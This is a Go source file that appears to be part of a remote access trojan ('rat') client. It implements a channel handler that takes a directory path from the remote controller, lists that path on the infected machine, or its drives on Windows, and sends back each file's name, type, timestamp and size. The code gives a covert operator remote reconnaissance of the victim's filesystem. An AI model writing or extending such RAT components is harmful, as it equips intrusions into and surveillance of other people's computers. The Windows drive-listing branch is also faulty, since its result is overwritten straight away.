package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"rat/client/drives"
	"rat/internal"

	"github.com/wille/osutil"
)

type ChannelQueryDirectory struct{}

func (ChannelQueryDirectory) Open(r io.ReadWriteCloser, c *Connection) error {
	path, _ := shared.ReadString(r)
	var files []os.FileInfo
	var err error

	if path == "" && osutil.Name == osutil.Windows {
		drives.QueryDrives()
		files = drives.Drives
	} else if path == "" {
		path = "/"
	}

	files, err = ioutil.ReadDir(path)
	if err != nil {
		fmt.Println(err.Error())
	}

	binary.Write(r, binary.LittleEndian, int32(len(files)))

	for _, file := range files {
		binary.Write(r, binary.LittleEndian, file.IsDir())
		shared.WriteString(r, file.Name())
		binary.Write(r, binary.LittleEndian, int64(file.ModTime().Unix()))
		binary.Write(r, binary.LittleEndian, file.Size())
	}

	return nil
}
